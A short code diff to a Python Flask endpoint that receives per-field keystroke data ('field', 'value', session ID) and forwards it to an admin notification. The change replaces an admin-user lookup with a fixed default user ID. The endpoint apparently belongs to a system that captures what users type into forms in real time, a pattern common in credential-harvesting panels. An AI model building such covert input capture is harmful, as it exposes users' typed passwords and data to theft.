@@ -388,15 +388,13 @@ def keystroke():
     session_id = data.get('session_id')
     if not session_id:
         return jsonify({"error": "Session ID is missing"}), 400
-
-    admin_user = get_admin_user()
-    if admin_user:
-        send_keystroke_notification_to_admin(
-            session_id=session_id,
-            field=data.get('field', 'N/A'),
-            value=data.get('value', ''),
-            admin_user=admin_user
-        )
+    
+    send_keystroke_notification_to_admin(
+        session_id=session_id,
+        field=data.get('field', 'N/A'),
+        value=data.get('value', ''),
+        user_id=DEFAULT_USER_ID
+    )
     return jsonify({"status": "received"}), 200
 
 
